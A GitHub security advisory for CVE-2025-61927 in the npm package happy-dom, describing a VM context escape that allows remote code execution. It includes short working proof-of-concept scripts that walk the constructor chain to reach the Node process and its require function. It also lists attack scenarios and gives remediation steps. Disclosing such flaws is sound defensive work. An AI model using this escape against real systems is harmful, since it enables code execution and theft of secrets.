# [C] Happy DOM: VM Context Escape can lead to Remote Code Execution

## Summary
Severity: Critical
Advisory: GHSA-37j7-fg3j-429f
CVE: CVE-2025-61927
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P (CVSS_V4)
Published: 2025-10-10
Source: https://github.com/advisories/GHSA-37j7-fg3j-429f
Type: github-advisory

## Affected
- npm: `happy-dom` — affected >=0 <20.0.0

## Details
# Escape of VM Context gives access to process level functionality

## Summary
Happy DOM v19 and lower contains a security vulnerability that puts the owner system at the risk of RCE (Remote Code Execution) attacks.

A Node.js VM Context is not an isolated environment, and if the user runs untrusted JavaScript code within the Happy DOM VM Context, it may escape the VM and get access to process level functionality.

It seems like what the attacker can get control over depends on if the process is using ESM or CommonJS. With CommonJS the attacker can get hold of the `require()` function to import modules.

Happy DOM has JavaScript evaluation enabled by default. This may not be obvious to the consumer of Happy DOM and can potentially put the user at risk if untrusted code is executed within the environment.

## Reproduce

### CommonJS (Possible to get hold of require)

```javascript
const { Window } = require('happy-dom');
const window = new Window({ console });

window.document.write(`
  <script>
     const process = this.constructor.constructor('return process')();
     const require = process.mainModule.require;
  
     console.log('Files:', require('fs').readdirSync('.').slice(0,3));
  </script>
`);
```
### ESM (Not possible to get hold of import or require)

```javascript
const { Window } = require('happy-dom');
const window = new Window({ console });

window.document.write(`
  <script>
     const process = this.constructor.constructor('return process')();
  
     console.log('PID:', process.pid);
  </script>
`);
```

## Potential Impact

#### Server-Side Rendering (SSR)
```javascript
const { Window } = require('happy-dom');
const window = new Window();
window.document.innerHTML = userControlledHTML;
```

#### Testing Frameworks
Any test suite using Happy-DOM with untrusted content may be at risk

## Attack Scenarios

1. **Data Exfiltration**: Access to environment variables, configuration files, secrets
2. **Lateral Movement**: Network access for connecting to internal systems. Happy DOM already gives access to the network by fetch, but has protections in place (such as CORS and header validation etc.).
3. **Code Execution**: Child process access for running arbitrary commands
4. **Persistence**: File system access

## Recommended Immediate Actions

1. Update Happy DOM to v20 or above
    - This version has JavaScript evaluation disabled by default
    - This version will output a warning if JavaScript is enabled in an insecure environment
2. Run Node.js with the "--disallow-code-generation-from-strings" if you need JavaScript evaluation enabled
    - This makes sure that evaluation can't be used at process level to escape the VM
    - `eval()` and `Function()` can still be used within the Happy DOM VM without any known security risk
    - Happy DOM v20 and above will output a warning if this flag is not in use
4. If you can't update Happy DOM right now, it's recommended to disable JavaScript evaluation, unless you completely trust the content within the environment

## Technical Root Cause

All classes and functions inherit from [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function). By walking the constructor chain it's possible to get hold of [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) at process level. As [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) can evaluate code from strings, it's possible to execute code at process level.

Running Node with the "--disallow-code-generation-from-strings" flag protects against this.

## References
- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-37j7-fg3j-429f
- https://nvd.nist.gov/vuln/detail/CVE-2025-61927
- https://github.com/capricorn86/happy-dom/commit/819d15ba289495439eda8be360d92a614ce22405
- https://github.com/capricorn86/happy-dom/commit/de438ad72921c69793584aa657b48d3655dfac97
- https://github.com/capricorn86/happy-dom
- https://github.com/capricorn86/happy-dom/releases/tag/v20.0.0
